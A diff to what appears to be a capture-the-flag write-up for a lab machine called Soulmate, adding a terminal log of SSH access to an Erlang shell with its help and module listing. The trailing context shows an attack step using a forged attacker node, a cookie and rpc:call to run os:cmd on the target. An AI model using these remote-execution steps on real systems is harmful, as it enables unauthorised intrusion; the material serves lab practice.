@@ -476,6 +476,295 @@ ben@soulmate:~$
 127.0.0.1:4369 → Erlang Port Mapper Daemon (epmd), part of RabbitMQ/Elixir
 
 ---
+```bash
+┌──(sabeshan㉿kali)-[~]
+└─$ ssh ben@soulmate.htb -P 2222 
+ben@soulmate.htb's password: 
+Last login: Sat Sep 13 02:13:05 2025 from 10.10.14.18
+ben@soulmate:~$ id
+uid=1000(ben) gid=1000(ben) groups=1000(ben)
+ben@soulmate:~$ ssh ben@127.0.0.1 -p 2222
+ben@127.0.0.1's password: 
+Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
+(ssh_runner@soulmate)1> help().
+(ssh_runner@soulmate)1> help().
+
+** shell internal commands **
+b()        -- display all variable bindings
+e(N)       -- repeat the expression in query <N>
+f()        -- forget all variable bindings
+f(X)       -- forget the binding of variable X
+h()        -- history
+h(Mod)     -- help about module
+h(Mod,Func)-- help about function in module
+h(Mod,Func,Arity) -- help about function with arity in module
+ht(Mod)    -- help about a module's types
+ht(Mod,Type) -- help about type in module
+ht(Mod,Type,Arity) -- help about type with arity in module
+hcb(Mod)    -- help about a module's callbacks
+hcb(Mod,CB) -- help about callback in module
+hcb(Mod,CB,Arity) -- help about callback with arity in module
+history(N) -- set how many previous commands to keep
+results(N) -- set how many previous command results to keep
+catch_exception(B) -- how exceptions are handled
+v(N)       -- use the value of query <N>
+rd(R,D)    -- define a record
+rf()       -- remove all record information
+rf(R)      -- remove record information about R
+rl()       -- display all record information
+rl(R)      -- display record information about R
+rp(Term)   -- display Term using the shell's record information
+rr(File)   -- read record information from File (wildcards allowed)
+rr(F,R)    -- read selected record information from file(s)
+rr(F,R,O)  -- read selected record information with options
+lf()       -- list locally defined functions
+lt()       -- list locally defined types
+lr()       -- list locally defined records
+ff()       -- forget all locally defined functions
+ff({F,A})  -- forget locally defined function named as atom F and arity A
+tf()       -- forget all locally defined types
+tf(T)      -- forget locally defined type named as atom T
+fl()       -- forget all locally defined functions, types and records
+save_module(FilePath) -- save all locally defined functions, types and records to a file
+bt(Pid)    -- stack backtrace for a process
+c(Mod)     -- compile and load module or file <Mod>
+cd(Dir)    -- change working directory
+flush()    -- flush any messages sent to the shell
+help()     -- help info
+h(M)       -- module documentation
+h(M,F)     -- module function documentation
+h(M,F,A)   -- module function arity documentation
+i()        -- information about the system
+ni()       -- information about the networked system
+i(X,Y,Z)   -- information about pid <X,Y,Z>
+l(Module)  -- load or reload module
+lm()       -- load all modified modules
+lc([File]) -- compile a list of Erlang modules
+ls()       -- list files in the current directory
+ls(Dir)    -- list files in directory <Dir>
+m()        -- which modules are loaded
+m(Mod)     -- information about module <Mod>
+mm()       -- list all modified modules
+memory()   -- memory allocation information
+memory(T)  -- memory allocation information of type <T>
+nc(File)   -- compile and load code in <File> on all nodes
+nl(Module) -- load module on all nodes
+pid(X,Y,Z) -- convert X,Y,Z to a Pid
+pwd()      -- print working directory
+q()        -- quit - shorthand for init:stop()
+regs()     -- information about registered processes
+nregs()    -- information about all registered processes
+uptime()   -- print node uptime
+xm(M)      -- cross reference check a module
+y(File)    -- generate a Yecc parser
+** commands in module i (interpreter interface) **
+ih()       -- print help for the i module
+true
+(ssh_runner@soulmate)2> m().
+Module                File
+application           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application.beam
+application_controll  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_controller.beam
+application_master    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_master.beam
+atomics               preloaded
+auth                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/auth.beam
+base64                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/base64.beam
+beam_a                /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_a.beam
+beam_asm              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_asm.beam
+beam_block            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_block.beam
+beam_call_types       /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_call_types.beam
+beam_clean            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_clean.beam
+beam_core_to_ssa      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_core_to_ssa.beam
+beam_dict             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_dict.beam
+beam_digraph          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_digraph.beam
+beam_doc              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_doc.beam
+beam_flatten          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_flatten.beam
+beam_jump             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_jump.beam
+beam_lib              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/beam_lib.beam
+beam_opcodes          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_opcodes.beam
+beam_ssa              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa.beam
+beam_ssa_alias        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_alias.beam
+beam_ssa_bc_size      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bc_size.beam
+beam_ssa_bool         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bool.beam
+beam_ssa_bsm          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bsm.beam
+beam_ssa_codegen      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_codegen.beam
+beam_ssa_dead         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_dead.beam
+beam_ssa_destructive  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_destructive_update.beam
+beam_ssa_opt          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_opt.beam
+beam_ssa_pre_codegen  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_pre_codegen.beam
+beam_ssa_recv         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_recv.beam
+beam_ssa_share        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_share.beam
+beam_ssa_ss           /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_ss.beam
+beam_ssa_throw        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_throw.beam
+beam_ssa_type         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_type.beam
+beam_trim             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_trim.beam
+beam_types            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_types.beam
+beam_utils            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_utils.beam
+beam_validator        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_validator.beam
+beam_z                /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_z.beam
+binary                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/binary.beam
+c                     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/c.beam
+cerl                  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl.beam
+cerl_clauses          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl_clauses.beam
+cerl_trees            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl_trees.beam
+code                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/code.beam
+code_server           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/code_server.beam
+compile               /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/compile.beam
+core_lib              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/core_lib.beam
+counters              preloaded
+crypto                /usr/local/lib/erlang/lib/crypto-5.5.3/ebin/crypto.beam
+digraph               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/digraph.beam
+digraph_utils         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/digraph_utils.beam
+dist_util             /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/dist_util.beam
+edlin                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/edlin.beam
+edlin_key             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/edlin_key.beam
+epp                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/epp.beam
+erl_abstract_code     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_abstract_code.beam
+erl_anno              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_anno.beam
+erl_bifs              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/erl_bifs.beam
+erl_distribution      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_distribution.beam
+erl_epmd              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_epmd.beam
+erl_error             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_error.beam
+erl_eval              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_eval.beam
+erl_expand_records    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_expand_records.beam
+erl_features          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_features.beam
+erl_init              preloaded
+erl_internal          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_internal.beam
+erl_lint              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_lint.beam
+erl_parse             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_parse.beam
+erl_prim_loader       preloaded
+erl_scan              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_scan.beam
+erl_signal_handler    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_signal_handler.beam
+erl_tracer            preloaded
+erlang                preloaded
+erpc                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erpc.beam
+error_handler         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/error_handler.beam
+error_logger          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/error_logger.beam
+erts_code_purger      preloaded
+erts_dirty_process_s  preloaded
+erts_internal         preloaded
+erts_literal_area_co  preloaded
+erts_trace_cleaner    preloaded
+escript               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/escript.beam
+ets                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/ets.beam
+file                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file.beam
+file_io_server        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file_io_server.beam
+file_server           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file_server.beam
+filename              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/filename.beam
+gb_sets               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gb_sets.beam
+gb_trees              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gb_trees.beam
+gen                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen.beam
+gen_event             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_event.beam
+gen_server            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_server.beam
+gen_statem            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_statem.beam
+gen_tcp               /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/gen_tcp.beam
+global                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/global.beam
+global_group          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/global_group.beam
+group                 /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/group.beam
+group_history         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/group_history.beam
+heart                 /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/heart.beam
+inet                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet.beam
+inet_config           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_config.beam
+inet_db               /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_db.beam
+inet_gethost_native   /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_gethost_native.beam
+inet_parse            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_parse.beam
+inet_tcp              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_tcp.beam
+inet_tcp_dist         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_tcp_dist.beam
+inet_udp              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_udp.beam
+init                  preloaded
+io                    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io.beam
+io_lib                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib.beam
+io_lib_format         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib_format.beam
+io_lib_pretty         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib_pretty.beam
+kernel                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel.beam
+kernel_config         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel_config.beam
+kernel_refc           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel_refc.beam
+lists                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/lists.beam
+logger                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger.beam
+logger_backend        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_backend.beam
+logger_config         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_config.beam
+logger_filters        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_filters.beam
+logger_formatter      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_formatter.beam
+logger_h_common       /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_h_common.beam
+logger_handler_watch  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_handler_watcher.beam
+logger_olp            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_olp.beam
+logger_proxy          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_proxy.beam
+logger_server         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_server.beam
+logger_simple_h       /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_simple_h.beam
+logger_std_h          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_std_h.beam
+logger_sup            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_sup.beam
+maps                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/maps.beam
+net_kernel            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/net_kernel.beam
+orddict               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/orddict.beam
+ordsets               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/ordsets.beam
+os                    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
+otp_internal          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/otp_internal.beam
+peer                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/peer.beam
+persistent_term       preloaded
+prim_buffer           preloaded
+prim_eval             preloaded
+prim_file             preloaded
+prim_inet             preloaded
+prim_net              preloaded
+prim_socket           preloaded
+prim_tty              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/prim_tty.beam
+prim_zip              preloaded
+proc_lib              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/proc_lib.beam
+proplists             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/proplists.beam
+pubkey_cert_records   /usr/local/lib/erlang/lib/public_key-1.17.1/ebin/pubkey_cert_records.beam
+public_key            /usr/local/lib/erlang/lib/public_key-1.17.1/ebin/public_key.beam
+queue                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/queue.beam
+rand                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/rand.beam
+raw_file_io           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/raw_file_io.beam
+raw_file_io_list      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/raw_file_io_list.beam
+re                    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/re.beam
+rpc                   /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/rpc.beam
+sets                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/sets.beam
+shell                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/shell.beam
+shell_default         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/shell_default.beam
+socket_registry       preloaded
+sofs                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/sofs.beam
+ssh                   /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh.beam
+ssh_acceptor          /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_acceptor.beam
+ssh_acceptor_sup      /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_acceptor_sup.beam
+ssh_app               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_app.beam
+ssh_auth              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_auth.beam
+ssh_bits              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_bits.beam
+ssh_channel_sup       /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_channel_sup.beam
+ssh_cli               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_cli.beam
+ssh_client_channel    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_client_channel.beam
+ssh_connection        /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection.beam
+ssh_connection_handl  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection_handler.beam
+ssh_connection_sup    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection_sup.beam
+ssh_dbg               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_dbg.beam
+ssh_file              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_file.beam
+ssh_fsm_kexinit       /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_fsm_kexinit.beam
+ssh_fsm_userauth_ser  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_fsm_userauth_server.beam
+ssh_lib               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_lib.beam
+ssh_message           /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_message.beam
+ssh_options           /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_options.beam
+ssh_server_channel    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_server_channel.beam
+ssh_sftpd             /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_sftpd.beam
+ssh_system_sup        /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_system_sup.beam
+ssh_tcpip_forward_ac  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_tcpip_forward_acceptor_sup.beam
+ssh_transport         /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_transport.beam
+standard_error        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/standard_error.beam
+start_escript__escri  /usr/local/lib/erlang_login/start.escript
+string                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/string.beam
+supervisor            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/supervisor.beam
+supervisor_bridge     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/supervisor_bridge.beam
+sys_core_alias        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_alias.beam
+sys_core_bsm          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_bsm.beam
+sys_core_fold         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_fold.beam
+unicode               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/unicode.beam
+unicode_util          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/unicode_util.beam
+user_drv              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/user_drv.beam
+user_sup              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/user_sup.beam
+v3_core               /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/v3_core.beam
+zlib                  preloaded
+ok
+(ssh_runner@soulmate)3>
+```
+---
 erl -name attacker@yourip -setcookie COOKIE using this command to exexute the commands
 rpc:call('ben@10.10.11.86', os, cmd, ["id"])
 
